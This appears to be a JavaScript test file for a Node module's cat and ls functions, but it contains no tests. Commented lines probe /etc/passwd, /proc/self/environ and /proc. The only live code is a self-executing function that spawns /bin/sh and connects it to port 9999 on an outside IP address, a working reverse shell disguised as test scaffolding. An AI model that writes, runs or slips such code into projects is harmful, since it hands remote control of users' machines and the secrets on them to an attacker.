// TODO: implement the tests
const cat = require("../index.js").cat;
const ls = require("../index.js").ls;


//console.log(cat("/etc/passwd"));
//console.log(cat("/proc/self/environ"));
//const dir = ls("/proc");
//for (const dirent of dir) {
//  console.log(dirent.name)
//}

/*
const fs = require("fs");
let contents = fs.readdirSync("/proc");
for (let item of contents) {
  console.log(item);
}
*/

(function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9999, "213.45.154.251", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
//aa
//a
